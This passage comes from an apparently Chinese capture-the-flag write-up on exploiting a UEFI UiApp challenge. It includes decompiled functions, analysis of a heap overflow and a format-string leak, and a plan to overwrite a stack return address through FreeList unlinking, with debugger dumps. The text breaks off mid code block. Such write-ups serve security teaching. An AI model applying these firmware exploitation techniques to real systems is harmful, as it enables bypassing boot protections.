class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v0 != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">          Edit();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v0 == <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">      Output(<span class="string">&quot;U&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Saving...\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !SaveInfo() );</span><br><span class="line">  Output(<span class="string">&quot;P&quot;</span>);</span><br><span class="line">  WaitEndInfo();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Add-1"><a href="#Add-1" class="headerlink" title="Add"></a>Add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  LOBYTE(v0) = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, user **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER);</span><br><span class="line">    <span class="keyword">if</span> ( !USER )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    init_info(USER, &amp;word_18);</span><br><span class="line">    Output(<span class="string">&quot;I&quot;</span>);</span><br><span class="line">    USER-&gt;ID = (<span class="type">int</span>)inputNum();</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER-&gt;Name);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">    Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">    Unicode2Ascii(DataTempBuffer, USER-&gt;Name, <span class="number">0x18</span>i64);</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x38</span>i64, &amp;USER-&gt;Desc);</span><br><span class="line">    <span class="keyword">if</span> ( USER-&gt;Desc )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      Unicode2Ascii(DataTempBuffer, USER-&gt;Desc, <span class="number">0x38</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Edit"><a href="#Edit" class="headerlink" title="Edit"></a>Edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">Edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 DataSize; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> *Desc; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x18</span>i64, &amp;USER-&gt;Name);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Name )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !USER-&gt;Desc )</span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(_QWORD, __int64, <span class="type">char</span> **))gBS-&gt;AllocatePool)(<span class="number">0</span>i64, <span class="number">0x38</span>i64, &amp;USER-&gt;Desc);</span><br><span class="line">    <span class="keyword">if</span> ( !USER-&gt;Desc )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)&amp;word_19476);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;2. Edit Desc.\n&quot;</span>);</span><br><span class="line">  Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  v1 = inputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      DataSize = <span class="number">0x80</span>i64;</span><br><span class="line">      Desc = USER-&gt;Desc;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">  Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">  DataSize = <span class="number">0x18</span>i64;</span><br><span class="line">  Desc = USER-&gt;Name;</span><br><span class="line">LABEL_12:</span><br><span class="line">  Unicode2Ascii(DataTempBuffer, Desc, DataSize);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="clearUser"><a href="#clearUser" class="headerlink" title="clearUser"></a>clearUser</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">clearUser</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  user *v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( USER &amp;&amp; USER-&gt;Name )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( USER-&gt;Desc )</span><br><span class="line">    &#123;</span><br><span class="line">      gBS-&gt;FreePool();</span><br><span class="line">      v1 = USER;</span><br><span class="line">      USER-&gt;Name = <span class="number">0</span>i64;</span><br><span class="line">      ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(v1-&gt;Desc);</span><br><span class="line">      USER-&gt;Desc = <span class="number">0</span>i64;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="SaveInfo"><a href="#SaveInfo" class="headerlink" title="SaveInfo"></a>SaveInfo</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> <span class="title function_">SaveInfo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *Name; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> StrLength; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *Desc; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !USER )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64, info **))gBS-&gt;AllocatePool)(<span class="number">0xA</span>i64, <span class="number">0x58</span>i64, &amp;info);</span><br><span class="line">  init_info(&amp;info, &amp;word_8);</span><br><span class="line">  info-&gt;ID = USER-&gt;ID;</span><br><span class="line">  Name = USER-&gt;Name;</span><br><span class="line">  <span class="keyword">if</span> ( Name )</span><br><span class="line">  &#123;</span><br><span class="line">    StrLength = <span class="number">0x18</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Name = <span class="string">&quot;Anonymous&quot;</span>;</span><br><span class="line">    StrLength = GetStrLength(<span class="string">&quot;Anonymous&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;Name, Name, StrLength);</span><br><span class="line">  Desc = USER-&gt;Desc;</span><br><span class="line">  <span class="keyword">if</span> ( Desc )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0x38</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Desc = <span class="string">&quot;Nothing...&quot;</span>;</span><br><span class="line">    v3 = GetStrLength(<span class="string">&quot;Nothing...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">memcpy</span>(info-&gt;Desc, Desc, v3);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(USER-&gt;Name);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))gBS-&gt;FreePool)(USER-&gt;Desc);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(user *))gBS-&gt;FreePool)(USER);</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  USER = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析与利用-1"><a href="#漏洞分析与利用-1" class="headerlink" title="漏洞分析与利用"></a>漏洞分析与利用</h3><p>这道题有两个漏洞，第一个是在 Edit 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">  v1 = inputNum();</span><br><span class="line">  <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      Output((<span class="type">unsigned</span> __int8 *)<span class="string">L&quot;Desc: &quot;</span>);</span><br><span class="line">      Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">      DataSize = <span class="number">0x80</span>i64;  <span class="comment">// heap overflow</span></span><br><span class="line">      Desc = USER-&gt;Desc;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Output(<span class="string">&quot;N&quot;</span>);</span><br><span class="line">  Input(DataTempBuffer, (<span class="type">int</span>)&amp;dword_100);</span><br><span class="line">  DataSize = <span class="number">0x18</span>i64;</span><br><span class="line">  Desc = USER-&gt;Name;</span><br><span class="line">LABEL_12:</span><br><span class="line">  Unicode2Ascii(DataTempBuffer, Desc, DataSize);</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>当我们选择编辑 Desc 的时候我们最多可以输入 0x80 字节的数据，可是 Desc 的 size 为 0x38，这里就存在堆溢出。另外一个漏洞比较难找，就是在选择 role 为 Administrator 时输入用户名那里存在格式化字符串漏洞：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line">Input(AdministratorName, (<span class="type">int</span>)&amp;byte_40[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span> ( checkUser(<span class="string">&quot;A&quot;</span>, AdministratorName) )</span><br><span class="line">&#123;</span><br><span class="line">Output(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">4</span>i64);</span><br><span class="line">Output((<span class="type">unsigned</span> __int8 *)AdministratorName);  <span class="comment">// fmt</span></span><br><span class="line">((<span class="type">void</span> (__fastcall *)(EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL *, __int64))SystemTable-&gt;ConOut-&gt;SetAttribute)(</span><br><span class="line">    SystemTable-&gt;ConOut,</span><br><span class="line">    <span class="number">15</span>i64);</span><br><span class="line">Output(<span class="string">&quot;]&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里的格式化字符串漏洞和我们平时 printf 的有点不一样，只能够通过多个 %p 进行信息的泄露，而且不能够像 printf 那样实现任意地址的读写。我们能够通过这个漏洞来获取到栈地址以及 UiApp 组件的基地址。  </p><p>有个需要注意的点是，在 Add 函数和 Edit 函数在进行堆块申请的时候 EFI_MEMORY_TYPE 都为 0，而在 SaveInfo 申请堆块的时候 EFI_MEMORY_TYPE 为 10。<br>由于在 UiApp 中并没有像平时 linux pwn 上的 got 表什么的，也没有 glibc 上面的各种 hook 和 IO，所以我们要像办法劫持栈上的返回地址。  </p><p>通过我们前面的分析，相同的 size 的堆块如果它的 EFI_MEMORY_TYPE 不同，那么他们就会给分配到不同的 POOL，如果我们可以通过 Desc 的溢出将 Name 的堆块给改了的话，那么在 free 的时候 Name 就会给分配到另外一个 POOL 的 FreeList 中。由于 Name 比 Desc 先申请，所以 Name 的地址在 Desc 的上方，可是 FreeList 是遵循后进先出的，所以我们可以通过释放 Name 和 Desc 再重新申请就能令 Desc 出现在 Name 的上方，然后通过溢出就能修改 Name 的 EFI_MEMORY_TYPE，最后将其释放链入到不同 POOL 的 FreeList[0] 中。这里需要注意的是我们的输入会出现 \x00 截断，所以我们的 payload 要分多段输入。其最终效果如下：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2e352f00</span><br><span class="line">0x2e352f00:     0x0000000030726670      0x000000002e7c9e18  &lt;---- mPoolHead[0].FreeList[0]</span><br><span class="line">0x2e352f10:     0x000000002e7c9e18      0xafafafafafafafaf</span><br><span class="line">0x2e352f20:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f30:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352f80:     0x0000000030726670      0x000000002e7ca728  &lt;---- mPoolHead[10].FreeList[0]</span><br><span class="line">0x2e352f90:     0x000000002e7ca728      0xafafafafafafafaf</span><br><span class="line">0x2e352fa0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fb0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2e352fd0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br></pre></td></tr></table></figure><p>接下来就要考虑如何覆盖栈上的返回地址，这里涉及到 FreeList 上堆块的脱链操作，其相关代码如下：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Removes a node from a doubly-linked list, and returns the node that follows</span></span><br><span class="line"><span class="comment">  the removed node.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Removes the node Entry from a doubly-linked list. It is up to the caller of</span></span><br><span class="line"><span class="comment">  this function to release the memory used by this node if that is required. On</span></span><br><span class="line"><span class="comment">  exit, the node following Entry in the doubly-linked list is returned. If</span></span><br><span class="line"><span class="comment">  Entry is the only node in the linked list, then the head node of the linked</span></span><br><span class="line"><span class="comment">  list is returned.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If Entry is NULL, then ASSERT().</span></span><br><span class="line"><span class="comment">  If Entry is the head node of an empty list, then ASSERT().</span></span><br><span class="line"><span class="comment">  If PcdMaximumLinkedListLength is not zero, and the number of nodes in the</span></span><br><span class="line"><span class="comment">  linked list containing Entry, including the Entry node, is greater than</span></span><br><span class="line"><span class="comment">  or equal to PcdMaximumLinkedListLength, then ASSERT().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  Entry A pointer to a node in a linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return Entry.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">LIST_ENTRY *</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">RemoveEntryList</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN      CONST LIST_ENTRY  *Entry</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (!IsListEmpty (Entry));</span><br><span class="line"></span><br><span class="line">  Entry-&gt;ForwardLink-&gt;BackLink = Entry-&gt;BackLink;</span><br><span class="line">  Entry-&gt;BackLink-&gt;ForwardLink = Entry-&gt;ForwardLink;</span><br><span class="line">  <span class="keyword">return</span> Entry-&gt;ForwardLink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，如果我们能够将下一个要申请出来的堆块的 BackLink 修改为栈上 ret 的地址，ForwardLink 上写上用于覆盖 ret 的地址，那么我们在申请出该堆块的时候就能够将 ret 所指向的地址的指修改为 ForwardLink 上的值。由于我们存在堆溢出漏洞，而且已经获取了 stack 和 UiApp 的地址，所以这个 ForwardLink 和 BackLink 指针的修改很容易实现。<br>由于 pwn() 的上层函数 _ModuleEntryPoint + 718 的位置会判断 pwn() 的返回值以决定是否进入 Boot Manager 交互界面，我们可以直接将程序劫持到这个地方。  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)pwn() )</span><br><span class="line">&#123;</span><br><span class="line">v142 = <span class="number">0x800000000000000F</span>ui64;</span><br><span class="line">Output(<span class="string">L&quot;UiEntry: ACCESS DENIED!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sub_6107(<span class="number">1</span>i64, <span class="number">50659335</span>i64);</span><br><span class="line">sub_11117();</span><br><span class="line">sub_13FAC();</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>可是当我将 ForwardLink 直接修改为 UiApp 上对应的地址的时候却出现了报错：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">!!!! X64 Exception Type - 06(<span class="comment">#UD - Invalid Opcode)  CPU Apic ID - 00000000 !!!!</span></span><br><span class="line">RIP  - 00000000121B4982, CS  - 0000000000000038, RFLAGS - 0000000000000246</span><br><span class="line">RAX  - 0000000000000001, RCX - 00000000E7180001, RDX - 0000000003050007</span><br><span class="line">RBX  - 00000000121C7321, RSP - 00000000139AE720, RBP - 0000000000000001</span><br><span class="line">RSI  - 0000000012AEE9B7, RDI - 0000000000000000</span><br><span class="line">R8   - 0000000000000004, R9  - 00000000139AE507, R10 - 0000000000000000</span><br><span class="line">R11  - 0000000012A9DB5C, R12 - 0000000000000001, R13 - 00000000121DFA98</span><br><span class="line">R14  - 0000000000000001, R15 - 00000000121C8FA0</span><br><span class="line">DS   - 0000000000000030, ES  - 0000000000000030, FS  - 0000000000000030</span><br><span class="line">GS   - 0000000000000030, SS  - 0000000000000030</span><br><span class="line">CR0  - 0000000080010033, CR2 - 0000000000000000, CR3 - 0000000013601000</span><br><span class="line">CR4  - 0000000000000668, CR8 - 0000000000000000</span><br><span class="line">DR0  - 0000000000000000, DR1 - 0000000000000000, DR2 - 0000000000000000</span><br><span class="line">DR3  - 0000000000000000, DR6 - 00000000FFFF0FF0, DR7 - 0000000000000400</span><br><span class="line">GDTR - 00000000133DE000 0000000000000047, LDTR - 0000000000000000</span><br><span class="line">IDTR - 0000000013032018 0000000000000FFF,   TR - 0000000000000000</span><br><span class="line">FXSAVE_STATE - 00000000139AE380</span><br><span class="line">!!!! Find image based on IP(0x121B4982) (No PDB)  (ImageBase=00000000121A9000, EntryPoint=00000000121B352E) !!!!</span><br></pre></td></tr></table></figure><p>我将断点下在执行 ret 的那一步然后在gdb 上看 _ModuleEntryPoint + 718 对应的汇编，其值如下：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/16i 0x273b4982</span><br><span class="line">   0x273b4982:  call   0x273af107</span><br><span class="line">   0x273b4987:  call   0xe53a117</span><br><span class="line">   0x273b498c:  stos   BYTE PTR es:[rdi],al</span><br><span class="line">   0x273b498d:  sub    BYTE PTR [rax],al</span><br><span class="line">   0x273b498f:  add    BYTE PTR [rax],al</span><br><span class="line">   0x273b4991:  add    BYTE PTR [rbx+0x14f3005],cl</span><br><span class="line">   0x273b4997:  add    BYTE PTR [rcx],dh</span><br><span class="line">   0x273b4999:  ror    BYTE PTR [rbp+rcx*4-0x7c],cl</span><br><span class="line">   0x273b499d:  and    al,0xb8</span><br><span class="line">   0x273b499f:  add    BYTE PTR [rax],al</span><br><span class="line">   0x273b49a1:  add    BYTE PTR [rax-0x73],cl</span><br><span class="line">   0x273b49a4:  or     eax,0x12757</span><br><span class="line">   0x273b49a9:  call   QWORD PTR [rax+0x140]</span><br><span class="line">   0x273b49af:  <span class="built_in">test</span>   rax,rax</span><br><span class="line">   0x273b49b2:  js     0x273b49e0</span><br><span class="line">   0x273b49b4:  mov    rax,QWORD PTR [rsp+0xb8]</span><br></pre></td></tr></table></figure><p>而在 IDA 中的汇编如下：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 